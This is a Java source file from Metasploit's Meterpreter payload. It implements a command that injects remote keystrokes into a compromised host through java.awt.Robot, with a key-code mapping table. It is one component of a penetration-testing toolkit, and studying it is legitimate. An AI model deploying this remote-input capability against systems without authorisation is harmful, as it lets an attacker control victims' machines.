package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.util.HashMap;
import java.util.Map;

public class stdapi_ui_send_keyevent_V1_4 extends stdapi_ui_send_keyevent implements Command {

    private static Map<Integer, Integer> keyMapping = new HashMap<Integer, Integer>()
    {
        {
            put(0x08, KeyEvent.VK_DELETE);
            put( 0x09 , KeyEvent.VK_TAB);
            put( 0x0C , KeyEvent.VK_CLEAR);
            put( 0x0D , KeyEvent.VK_ENTER);
            put( 0xBA , KeyEvent.VK_SEMICOLON);
            put( 0xBB , KeyEvent.VK_EQUALS);
            put( 0xBC , KeyEvent.VK_COMMA);
            put( 0xBD , KeyEvent.VK_MINUS);
            put( 0xBE , KeyEvent.VK_PERIOD);
            put( 0xBF , KeyEvent.VK_SLASH);
            put( 0xC0 , KeyEvent.VK_QUOTE);
            put( 0xDB , KeyEvent.VK_BRACELEFT);
            put( 0xDC , KeyEvent.VK_BACK_SLASH);
            put( 0xDD , KeyEvent.VK_BRACERIGHT);
            put( 0xDE , KeyEvent.VK_NUMBER_SIGN);
            put( 0xDF , KeyEvent.VK_BACK_QUOTE);
        }
    };

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        byte[] keyevents = request.getRawValue(TLVType.TLV_TYPE_KEYEVENT_SEND);
        for (int i=0;i<keyevents.length;i+=8) {
            int action = keyevents[i+3] << 24 | (keyevents[i+2] & 0xFF) << 16 | (keyevents[i+1] & 0xFF) << 8 | (keyevents[i] & 0xFF);
            int keycode = keyevents[i+7] << 24 | (keyevents[i+6] & 0xFF) << 16 | (keyevents[i+5] & 0xFF) << 8 | (keyevents[i+4] & 0xFF);
            Integer key = keyMapping.get(keycode);
            if (key != null) {
                keycode = key;
            }
            try {
                performKeyEvent(action, keycode);
            } catch (IllegalArgumentException ignored) {
            }
        }
        return ERROR_SUCCESS;
    }

    private void performKeyEvent(int action, int keycode) throws Exception {
        Robot robot = new Robot();
        if (action == 1) {
            robot.keyPress(keycode);
        } else if (action == 2) {
            robot.keyRelease(keycode);
        } else {
            robot.keyPress(keycode);
            robot.keyRelease(keycode);
        }
    }

}
